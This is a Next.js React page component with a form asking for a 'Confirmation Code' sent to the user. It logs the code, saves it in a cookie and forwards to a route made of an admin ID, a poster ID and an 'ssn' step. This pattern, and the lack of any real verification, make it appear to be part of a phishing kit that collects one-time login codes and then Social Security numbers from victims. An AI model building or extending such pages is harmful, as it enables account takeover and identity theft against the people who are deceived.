import { useState } from "react";
import Cookies from "js-cookie";
import { useRouter } from "next/router";
import { FaQuestion } from "react-icons/fa";

function CodePage() {
  const [code, setCode] = useState("");
  const router = useRouter();
  const { adminId, posterId } = router.query;

  const handleChange = (e) => {
    setCode(e.target.value);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log(code);
    Cookies.set("code", code);
    router.push(`/${adminId}/${posterId}/ssn`);
  };

  return (
    <div className="mx-3 lg:mx-[70px]">
      <form onSubmit={handleSubmit}>
        <div className="min-h-[calc(100vh-20px)] flex flex-col justify-between">
          <div className="lg:container px-3 lg:px-0">
            <div className="flex justify-end mt-[36px] text-slate-600 mb-[38px] ">
              <FaQuestion size={18} />
            </div>
            <p className="text-[25px]">Please enter the code sent to</p>

            <input
              type="text"
              value={code}
              className="input"
              placeholder="Confirmation Code"
              onChange={handleChange}
              required
            />
          </div>
          <button className="w-full text-lg bg-custom-green rounded-full py-3 text-white border-2 border-slate-900">
            Next
          </button>
        </div>
      </form>
    </div>
  );
}

export default CodePage;
